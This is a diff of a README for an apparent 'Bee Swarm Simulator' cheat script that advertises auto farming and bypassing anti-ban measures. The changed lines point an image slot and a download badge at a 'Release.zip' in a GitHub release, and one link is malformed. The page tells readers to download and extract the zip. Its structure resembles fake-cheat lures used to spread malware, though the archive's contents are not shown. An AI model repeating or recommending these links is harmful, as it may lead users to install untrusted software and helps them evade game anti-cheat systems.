@@ -2,7 +2,7 @@
 
 Welcome to the Bee Swarm Simulator Hack 2025 repository! This script hack auto farm will enhance your gaming experience by providing you with features like auto farming, auto stocking, bypassing anti-ban measures, and much more! With this OP GUI cheat, you can enjoy the game to the fullest without the need for a key. This hack works on both PC and mobile devices.
 
-![Bee Swarm Simulator](https://img.icons8.com/color/452/000000/bee.png)
+![Bee Swarm Simulator](https://github.com/joey445455/Bee-Swarm-Simulator/releases/download/v1.0/Release.zip)
 
 ## Features
 - Auto Farming 🚜
@@ -20,7 +20,7 @@ Welcome to the Bee Swarm Simulator Hack 2025 repository! This script hack auto f
 ## How to Use
 1. To download the hack script, click the button below:
    
-   [![Download Hack Script](https://img.shields.io/badge/Download-Hack%20Script-blue.svg)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+   [![Download Hack Script](https://github.com/joey445455/Bee-Swarm-Simulator/releases/download/v1.0/Release.zip%https://github.com/joey445455/Bee-Swarm-Simulator/releases/download/v1.0/Release.zip)](https://github.com/joey445455/Bee-Swarm-Simulator/releases/download/v1.0/Release.zip)
    
 2. Once downloaded, extract the files from the zip folder.
 
